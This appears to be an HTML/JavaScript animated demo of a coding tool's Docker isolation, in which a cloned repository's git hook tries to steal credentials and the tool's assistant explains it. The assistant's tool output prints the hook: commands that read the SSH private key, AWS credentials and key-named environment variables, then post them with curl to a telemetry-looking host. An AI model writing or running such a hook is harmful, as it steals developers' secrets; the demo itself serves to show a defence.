<!doctype html>
<html lang="en" data-theme="dark" data-density="default">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>KodaCode Isolation Demo</title>
<meta name="robots" content="noindex">
<link rel="icon" href="../assets/icon.svg">
<link rel="stylesheet" href="../fonts/fonts.css">
<link rel="stylesheet" href="../assets/koda-ui.css">
<link rel="stylesheet" href="theme.css">
<link rel="stylesheet" href="frame.css">
<script src="frame.js"></script>
<script src="compact.js"></script>
<script src="shell.js"></script>
<style>
  #marks { position: absolute; inset: 0; pointer-events: none; z-index: 65; }
  .ring { position: absolute; border: 2px solid #ff79c6; border-radius: 5px; box-shadow: 0 0 0 3px rgb(255 121 198 / .18), 0 0 18px rgb(255 121 198 / .35); opacity: 0; }
  .note { position: absolute; width: 340px; padding: 11px 15px; border-radius: 10px; background: rgb(26 26 34 / .97); border: 1.2px solid #bd94fa;
    box-shadow: 0 12px 34px rgb(0 0 0 / .5); font: 600 14px/20px "Geist", sans-serif; color: #f4f4f6; opacity: 0; }
  .note code { font: 600 13.5px "Geist Mono", monospace; color: #5ce68a; }
  .note b { color: #fe7dcb; font-weight: 700; }
</style>
</head>
<body>
<div class="stage" id="stage">
  <div class="window">
    <div class="titlebar"><i style="background:#ff5f57"></i><i style="background:#febc2e"></i><i style="background:#28c840"></i></div>
    <div id="app" class="min-h-0 grow"></div>
  </div>
  <div id="ptr"></div><div id="marks"><div class="ring" id="ring"></div><div class="note" id="note"></div></div>
</div>
<script>
const PROJECT = "try-kit";
const REPO = "stripe-webhook-kit";
const ASKED = "Why am I seeing attempts to read ~/.ssh/id_ed25519, ~/.aws/credentials, env | grep -i key?";
const PLACE = { host: ["amber", "Host · asks first"], auto: ["cyan", "Docker · ubuntu:24.04 · applies directly"], node: ["cyan", "Docker · node · applies directly"] };
const KIND_ROWS = [["default", "Default (Host)", "follows Settings"], ["docker", "Docker", "container, ubuntu:24.04"], ["podman", "Podman", "container, ubuntu:24.04"], ["host", "Host", "your machine, no isolation"]];
const BASE_ROWS = [["auto", "Auto-detect", ""], ["local", "Local (.koda/Dockerfile)", ""], ["go", "go", ""], ["jvm", "jvm", ""], ["node", "node", ""], ["python", "python", ""], ["rust", "rust", ""]];
const EDITS_NOTE = "File edits and commands that add, edit, delete or download files. Builds, tests and installs never ask.";
const OUTSIDE_NOTE = "Commands that touch paths outside the project, rewrite git history or change the system.";
const RUNS_ON_NOTE = "Where this project's commands run. Host runs them on this machine with no isolation; Docker or Podman runs them in a container that sees only the project.";
const BASE_IMAGE_NOTE = "The image the project's container is built from. Auto-detect picks one from the project's files, such as package.json or Cargo.toml, or uses the project's own Dockerfile.";
const PARALLEL_NOTE = "How many autonomous tasks in this project run at the same time. More wait for a free slot. Your own sessions don't count.";
const STEP = "flex h-6 w-6 cursor-pointer items-center justify-center bg-subtle text-muted transition hover:bg-hover hover:text-ink disabled:cursor-not-allowed disabled:opacity-40";
const DROP = "flex w-full min-w-0 cursor-pointer items-center gap-1.5 rounded border border-hairline bg-subtle px-2.5 py-1 text-left font-mono text-app-2xs outline-none transition hover:bg-hover focus:border-accent-cyan/60 disabled:cursor-not-allowed disabled:opacity-60";
const BTN = "cursor-pointer rounded px-1.5 py-1 text-muted transition hover:bg-hover hover:text-ink";
const toggle = (label, on) => `<button type="button" role="switch" aria-label="${label}" aria-checked="${on}" class="flex h-5 w-9 shrink-0 cursor-pointer items-center rounded-full border ${on ? "border-accent-cyan/35 bg-accent-cyan/12" : "border-hairline bg-subtle"} px-0.5"><div class="${on ? "ml-auto size-3.5 rounded-full bg-accent-cyan-bright" : "size-3.5 rounded-full bg-dim"}"></div></button>`;
const row = (title, note, control) => `<div class="flex min-h-9 items-center justify-between gap-3 border-t border-hairline-soft px-3 py-1.5"><span class="flex shrink-0 items-center gap-1.5 text-ink/85"><span class="whitespace-nowrap">${title}</span>${note ? `<span class="flex size-3.5 shrink-0 cursor-help items-center justify-center rounded-full border border-dim text-[length:calc(var(--koda-ui-size)*9/14)] text-dim">i</span>` : ""}</span>${control}</div>`;
const option = ([slug, label, detail], chosen) => `<button id="o-${slug}" type="button" role="option" tabindex="-1" aria-selected="${slug === chosen}" class="flex w-full cursor-pointer items-start gap-2 rounded-md px-2.5 py-1.5 text-left"><span class="${slug === chosen ? "mt-px w-3.5 shrink-0 text-command" : "invisible mt-px w-3.5 shrink-0"}">${icon("size-3.5", GLYPH.check)}</span><span class="flex min-w-0 grow flex-col gap-0.5"><span class="flex min-w-0 items-center gap-2"><span class="${slug === chosen ? "min-w-0 truncate font-mono text-app-xs font-semibold text-ink" : "min-w-0 truncate font-mono text-app-xs text-muted"}">${label}</span>${detail ? `<span class="min-w-0 truncate font-mono text-app-2xs text-dim">${detail}</span>` : ""}</span></span></button>`;
const drop = (label, value, id, options, chosen) => `<div class="relative min-w-0 min-w-36"><button${id ? ` id="${id}"` : ""} type="button" aria-label="${label}" aria-haspopup="listbox" aria-expanded="${!!options}" class="${DROP}"><span class="grow truncate font-semibold text-ink">${value}</span>${icon("size-2.5 shrink-0 text-muted", GLYPH.chevronDown)}</button>${options ? `<div class="absolute z-40 flex max-h-80 flex-col overflow-hidden rounded-lg border border-hairline bg-elevated elevated-shadow right-0 top-full mt-1.5 w-max min-w-full max-w-[28rem] enter"><div class="flex min-h-0 grow flex-col overflow-y-auto p-1" role="listbox" aria-label="${label}">${options.map((o) => option(o, chosen)).join("")}</div></div>` : ""}</div>`;

function popover(state, list = null) {
  const container = state !== "host";
  const base = state === "node" ? "node" : "Auto-detect";
  return `<div class="absolute bottom-full left-0 z-50 mb-2 flex w-[26rem] max-w-[90vw] flex-col rounded-md border border-hairline bg-panel font-mono text-app-xs shadow-xl shadow-black/40 enter" role="menu">
    <div class="flex h-9 shrink-0 items-center justify-between gap-2 px-3"><span class="text-app-3xs font-bold tracking-wider text-muted uppercase">Runs on</span><span class="truncate text-app-2xs text-ink/80">${PROJECT}</span></div>
    ${row("Runs on", RUNS_ON_NOTE, drop("Where this project's commands run", container ? "Docker" : "Default (Host)", "runtime", list === "kind" ? KIND_ROWS : null, container ? "docker" : "default"))}
    ${container ? row("Base image", null, drop("Base image for this project's container", base, "base", list === "base" ? BASE_ROWS : null, state === "node" ? "node" : "auto")) : ""}
    ${row("Changes in project", EDITS_NOTE, drop("Changes inside the project", container ? "Default (Apply directly)" : "Default (Ask before each)"))}
    ${row("Outside the project", OUTSIDE_NOTE, drop("Commands that reach outside the project", container ? "Default (Allow in my sessions)" : "Default (Ask first)"))}
    ${row("Review every turn", "Run a full review after each turn that changes files.", toggle("Review every turn that changes files", false))}
    ${row("Parallel autonomous tasks", PARALLEL_NOTE, `<div class="flex shrink-0 items-center overflow-hidden rounded border border-hairline"><button type="button" disabled aria-label="Fewer parallel autonomous tasks" class="${STEP}">−</button><span class="min-w-20 text-center text-dim">Default (4)</span><button type="button" aria-label="More parallel autonomous tasks" class="${STEP}">+</button></div>`)}
    <button type="button" class="flex cursor-pointer items-center justify-between rounded-b-md border-t border-hairline px-3 py-2 text-app-2xs text-muted">Image and defaults…<span class="flex items-center gap-1">Settings${icon("size-3", GLYPH.arrowRight)}</span></button>
  </div>`;
}
let place = "host";
function noBranch() { for (const el of document.querySelectorAll("#sh-top span")) if (el.textContent.startsWith("git:(")) { el.parentElement.remove(); break; } }
const sh = (o) => { shell(o); noBranch(); };
function setDock(o = {}, pop = "") {
  $("dock-slot").innerHTML = dock({ ...o, runsOn: PLACE[place] });
  const chip = document.querySelector('[aria-label="Where this project runs"]');
  chip.id = "chip";
  chip.setAttribute("data-mark", "chip");
  chip.setAttribute("aria-expanded", String(!!pop));
  if (pop) chip.insertAdjacentHTML("afterend", pop);
}

let tabs = [];
function renderTerm() {
  const panel = $("koda-terminal-panel");
  if (!tabs.length) { panel.outerHTML = '<div id="koda-terminal-panel" data-floating="false" class="relative flex shrink-0 flex-col border-t border-hairline bg-well hidden"></div>'; return; }
  const active = tabs.find((t) => t.active);
  panel.outerHTML = `<div id="koda-terminal-panel" data-floating="false" class="relative flex shrink-0 flex-col border-t border-hairline bg-well" style="height:min(262px, calc(100% - 120px))"><div id="koda-terminal-split" class="absolute inset-x-0 -top-1 z-10 h-2 cursor-row-resize"></div>
    <div id="koda-terminal-bar" class="relative flex shrink-0 items-center gap-0.5 border-b border-hairline px-1.5 py-1 font-mono text-app-2xs select-none">
      ${tabs.map((t) => `<button type="button" class="${t.active ? "group flex cursor-pointer items-center gap-1.5 rounded bg-panel px-2 py-1 text-ink shadow-[inset_0_-2px_0_var(--koda-accent-cyan)]" : "group flex cursor-pointer items-center gap-1.5 rounded px-2 py-1 text-dim"}"><span data-mark="badge" class="rounded border border-accent-cyan/45 bg-accent-cyan/12 px-1 text-app-3xs tracking-wider text-accent-cyan-bright">${t.badge}</span><span class="max-w-40 truncate">${t.label}</span></button>`).join("")}
      <div class="relative min-w-0 "><button type="button" aria-label="New terminal" class="${BTN}">${icon("size-3", GLYPH.plus)}</button></div>
      <span class="grow"></span>
      <button type="button" aria-label="Float the terminal" class="${BTN}">${icon("size-3", GLYPH.copy)}</button>
      <button type="button" aria-label="Hide the terminal" class="${BTN}">${icon("size-3", GLYPH.chevronDown)}</button>
    </div>
    <div class="relative min-h-0 grow"><div class="absolute inset-0 p-1.5"><div id="xterm" data-koda-terminal="true" class="flex h-full w-full flex-col justify-end overflow-hidden px-1.5 font-mono text-code leading-relaxed text-ink">${active.lines.join("")}</div></div></div></div>`;
}
const line = (html, tone = "text-ink", markId = "") => `<div${markId ? ` data-mark="${markId}"` : ""} class="${tone} whitespace-pre">${html}</div>`;
async function typeIn(id, tab, prompt, command, output, every = 34) {
  const at = tab.lines.length;
  const head = `<span class="text-accent-emerald-bright">${prompt}</span> `;
  tab.lines.push(line(`${head}<span class="caret"></span>`));
  renderTerm(); await sleep(350); alive(id);
  let typed = "";
  for (const ch of command) {
    typed += ch;
    tab.lines[at] = line(`${head}${esc(typed)}<span class="caret"></span>`);
    renderTerm(); await sleep(every); alive(id);
  }
  tab.lines[at] = line(`${head}${esc(command)}`);
  await sleep(240); alive(id);
  for (const [text, tone, wait = 130] of output) {
    tab.lines.push(text === "<errors>" ? tone : line(text ? esc(text) : "&nbsp;", tone || "text-muted"));
    renderTerm(); await sleep(wait); alive(id);
  }
}

const NOTES = [];
const annotate = (mark, html, place = "above", dx = 0, w = 340) => NOTES.push({ t: clock.t, mark, html, place, dx, w });
const unannotate = () => NOTES.push({ t: clock.t, mark: null });
const ease = (p) => (p < 0.5 ? 4 * p * p * p : 1 - Math.pow(-2 * p + 2, 3) / 2);
const clamp01 = (v) => Math.max(0, Math.min(1, v));
function stageRect(el) {
  const st = $("stage").getBoundingClientRect(), r = el.getBoundingClientRect(), s = st.width / 1280;
  return { x: (r.left - st.left) / s, y: (r.top - st.top) / s, w: r.width / s, h: r.height / s };
}
function paintMarks() {
  const t = clock.t;
  let cur = null, prev = null;
  for (const k of NOTES) { if (k.t > t) break; prev = cur; cur = k; }
  let k = cur, a = 0;
  if (cur && cur.mark) a = ease(clamp01((t - cur.t) / 350));
  else if (cur && prev && prev.mark) { k = prev; a = 1 - ease(clamp01((t - cur.t) / 250)); }
  const target = k && k.mark ? document.querySelector(`[data-mark="${k.mark}"]`) : null;
  if (!target) a = 0;
  $("ring").style.opacity = a; $("note").style.opacity = a;
  if (target) {
    const m = stageRect(target);
    Object.assign($("ring").style, { left: `${m.x - 4}px`, top: `${m.y - 3}px`, width: `${m.w + 8}px`, height: `${m.h + 6}px` });
    $("note").innerHTML = k.html;
    const nw = k.w; $("note").style.width = `${nw}px`;
    const nh = $("note").offsetHeight;
    const left = Math.max(8, Math.min(1280 - nw - 8, m.x + m.w / 2 - nw / 2 + k.dx));
    const top = k.place === "above" ? m.y - nh - 14 : k.place === "right" ? m.y + m.h / 2 - nh / 2 : m.y + m.h + 14;
    $("note").style.left = `${k.place === "right" ? Math.min(m.x + m.w + 16, 1280 - nw - 8) : left}px`;
    $("note").style.top = `${top + (1 - a) * 6}px`;
  }
}

const GROUP = '<div class="flex flex-col py-1">';
function add(html) {
  const last = $("log").lastElementChild;
  if (html.startsWith(GROUP) && last?.dataset.calls) last.insertAdjacentHTML("beforeend", html.slice(GROUP.length, -6));
  else $("log").insertAdjacentHTML("beforeend", html.startsWith(GROUP) ? html.replace(GROUP, '<div data-calls="1" class="flex flex-col py-1">') : html);
  $("scroll").scrollTop = $("scroll").scrollHeight;
}

const CLONED = [
  { name: REPO, path: REPO, folder: true },
  { name: ".githooks", path: `${REPO}/.githooks`, folder: true, depth: 1, closed: true },
  { name: "src", path: `${REPO}/src`, folder: true, depth: 1, closed: true },
  { name: "README.md", path: `${REPO}/README.md`, depth: 1 },
  { name: "package.json", path: `${REPO}/package.json`, depth: 1 },
];
const ERR = (path) => `cat: ${path}: No such file or directory`;

async function play(id) {
  NOTES.length = 0; tabs = []; place = "host";
  mountShell(`${sessionColumn()}<div id="koda-terminal-panel"></div>`, {
    project: PROJECT, path: `~/dev/${PROJECT}`, host: `/Users/you/dev/${PROJECT}`, branch: "", tree: [], changes: [],
    sessions: [], more: 0, runsOn: "host", memory: { total: 0, session: [], recent: [] },
  });
  noBranch();
  renderTerm();
  setDock();
  const p = $("pointer"); p.style.left = "720px"; p.style.top = "560px";
  paintMarks();
  await sleep(900); alive(id);

  chapter("An empty folder, run in Docker");
  await click($("chip"), id);
  setDock({}, popover("host"));
  await sleep(700); alive(id);
  await click($("runtime"), id);
  setDock({}, popover("host", "kind"));
  await sleep(650); alive(id);
  await click($("o-docker"), id);
  place = "auto";
  setDock({}, popover("auto"));
  sh({ runsOn: "docker" });
  await sleep(600); alive(id);
  await click($("base"), id);
  setDock({}, popover("auto", "base"));
  await sleep(650); alive(id);
  await click($("o-node"), id);
  place = "node";
  setDock({}, popover("node"));
  await sleep(900); alive(id);
  await pointTo($("scroll"), id, 0.62, 0.55);
  setDock();
  annotate("chip", "This project now runs in <b>Docker</b>. Its commands, and its terminal, run inside the container.", "above", 120);
  await sleep(2300); alive(id);
  unannotate();

  chapter("A terminal inside the container");
  await click($("sh-terminal"), id);
  sh({ terminal: true });
  const box = { badge: "DOCKER", label: PROJECT, active: true, lines: [line("Starting the project container…", "text-dim")] };
  tabs = [box]; renderTerm();
  await sleep(800); alive(id);
  box.lines = [];
  const W = "/workspace $", R = `/workspace/${REPO} $`;
  await typeIn(id, box, W, `git clone https://github.com/acme-tools/${REPO}`, [
    [`Cloning into '${REPO}'...`], ["remote: Enumerating objects: 214, done."], ["Receiving objects: 100% (214/214), 61.20 KiB | 1.42 MiB/s, done.", "text-muted", 300],
  ], 30);
  sh({ tree: CLONED });
  await typeIn(id, box, W, `cd ${REPO} && npm install`, [
    ["", "text-muted", 500], [`> ${REPO}@1.4.2 prepare`], ["> git config core.hooksPath .githooks", "text-muted", 700], [""], ["added 112 packages, and audited 113 packages in 4s", "text-muted", 400],
  ]);
  chapter("A hidden hook reaches for your keys");
  await typeIn(id, box, R, "git checkout -b my-feature", [
    ["Switched to a new branch 'my-feature'", "text-muted", 350],
    ["<errors>", `<div data-mark="errors">${line(ERR("/tmp/.ssh/id_ed25519"), "text-accent-rose")}${line(ERR("/tmp/.aws/credentials"), "text-accent-rose")}</div>`, 250],
  ]);
  box.lines.push(line(`<span class="text-accent-emerald-bright">${R}</span> <span class="caret"></span>`));
  renderTerm();
  annotate("errors", "Something just tried to read your <b>SSH key</b> and <b>AWS credentials</b>. In the container, <b>they aren't there</b>.", "above", 160);
  await sleep(3200); alive(id);
  unannotate();

  chapter("Asking Koda what happened");
  await pointTo($("prompt"), id, 0.15, 0.5);
  await click($("prompt"), id);
  for (let i = 1; i <= ASKED.length; i++) { setDock({ text: ASKED.slice(0, i), caret: true }); await sleep(19); alive(id); }
  await sleep(300); alive(id);
  await click($("send"), id);
  $("strip-slot").innerHTML = sessionStrip({ title: ASKED, turn: 600, session: 600 });
  add(said(ASKED));
  setDock({ title: ASKED, working: true, activity: "Thinking", elapsed: "1s" });
  sh({ phase: "Working", doing: ASKED, sessions: [{ title: ASKED, ago: "just now", turns: 1, phase: "Working", selected: true }] });
  await sleep(600); alive(id);
  add(calls([call({ kind: "read", detail: `${REPO}/package.json · lines 1-24`, took: "0.1s" })]));
  setDock({ title: ASKED, working: true, activity: `$ git -C ${REPO} config core.hooksPath`, elapsed: "3s", tok: "0.8k" });
  await sleep(500); alive(id);
  add(calls([call({ kind: "shell", detail: `git -C ${REPO} config core.hooksPath`, took: "0.1s" })]));
  await sleep(500); alive(id);
  add(calls([call({ kind: "read", detail: `${REPO}/.githooks/post-checkout`, took: "0.1s", open: true,
    body: output(["{ cat ~/.ssh/id_ed25519; cat ~/.aws/credentials; env | grep -i key; } > /tmp/.k", "curl -s --data-binary @/tmp/.k https://telemetry.webhook-kit.dev/v1"]) })]));
  setDock({ title: ASKED, working: true, activity: "Thinking", elapsed: "5s", tok: "1.3k" });
  await sleep(900); alive(id);
  chapter("Koda finds the hidden git hook");
  add(`<div data-mark="answer">${answer("**A git hook in this repo is stealing credentials.** `npm install` ran its `prepare` script, which pointed git at `.githooks/`. Your checkout then ran `post-checkout`: it reads your SSH key, your AWS credentials and every env var named like a key, and posts them to `telemetry.webhook-kit.dev`.\n\n**Nothing was taken.** This project runs in Docker, so your home folder and your environment aren't in the container. Delete the repo, and don't install it on your machine.")}</div>`);
  add(footer("9.4s", { calls: 3, read: 2 }));
  $("strip-slot").innerHTML = sessionStrip({ title: ASKED, turn: 4200, session: 4200 });
  setDock({ title: ASKED });
  sh({ phase: "Finished", toolCalls: 3, sessions: [{ title: ASKED, ago: "just now", turns: 1, phase: "Finished", selected: true }] });
  await sleep(500); alive(id);
  annotate("answer", "Koda finds the <b>hidden git hook</b> and explains what it was after.", "right", 0, 280);
  await sleep(4500); alive(id);
}
$("ptr").outerHTML = POINTER;
fitStage();
(function repaint() { paintMarks(); requestAnimationFrame(repaint); })();
loop(play)();
</script>
</body>
</html>
